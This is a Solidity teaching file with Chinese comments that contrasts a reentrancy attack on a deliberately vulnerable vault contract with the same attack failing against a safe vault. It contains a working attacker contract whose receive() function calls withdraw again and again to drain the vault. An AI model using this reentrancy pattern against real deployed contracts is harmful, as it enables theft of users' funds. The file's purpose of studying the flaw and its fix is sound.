// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;
import "./VaultVunlnerable.sol";
import "./Vault.sol";

/// 针对不安全 Vault 的重入攻击
/**
 * 理解：
 *  attack(): 存1 -> 取1，第一次 withdraw 里会 call 给本合约 -> 触发 receive()
 *  不安全 Vault: receive 里再 withdraw 时，balances 还是1 ether -> 一直提到 vault 空
 *  安全 Vault: 第一次 withdraw 里已经把balances 减成0 -> receive 里再 withdraw 会 Insufficient balance
 */
contract AttackerVulnerable {
    VaultVunlnerable public vault;

    constructor(VaultVunlnerable _vault) {
        vault = _vault;
    }

    /// 先 vault.deposit{value: ...}() 存一笔，再 vault.withdraw(...)触发第一次取款
    /// 先存 1 ether，再取 1 ether，触发 receive 里反复 withdraw，直到 vault 里余额为 0
    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether");
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    /// 当攻击者合约收到以太币时，会触发 receive 函数
    /// 由于是 payable 修饰符，这个函数可以接收以太币，所以可以触发 receive。
    /// 这个函数的作用是，当攻击者合约收到以太币时，会再次调用 vault.withdraw(1 ether) 函数，从而触发重入攻击。
    receive() external payable {
        // Vault 里还有 ETH，且记账上还有余额 -> 再提 （不安全 Vault 里记账还没减）
        if (address(vault).balance >= 1 ether && vault.balances(address(this)) >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}

contract AttackerSafe {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether");
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        // Vault 里还有 ETH，且记账上还有余额 -> 再提 （安全 Vault 里记账已减）
        if (address(vault).balance >= 1 ether && vault.balances(address(this)) >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}
